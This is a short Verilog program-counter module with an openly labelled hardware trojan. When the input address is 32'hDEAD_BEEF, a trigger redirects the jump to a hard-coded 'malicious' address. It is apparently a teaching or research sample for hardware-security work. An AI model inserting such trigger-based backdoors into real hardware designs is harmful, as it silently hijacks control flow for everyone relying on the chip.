`timescale 1ns / 1ps

module PC #(parameter n = 32) 
    (
        input clk,
        input rst,
        input shift_done,
        input [n-1:0] din,
        output reg [n-1:0] dout
    );

    // Example of a trojan trigger condition.
    // Let's say the trojan activates when trying to jump to address 32'hDEAD_BEEF.
    wire trojan_trigger = (din == 32'hDEAD_BEEF);

    always @ (posedge clk) begin
        if (rst)
            dout <= {n{1'b0}};
        else if (shift_done) begin
            if (trojan_trigger) begin
                // Instead of jumping to the intended address, jump to a malicious address.
                dout <= 32'hBAD; // Example of a trojan malicious address
            end else begin
                dout <= din; // Normal behavior
            end
        end else begin
            dout <= dout; // Hold value
        end
    end

endmodule
 
 
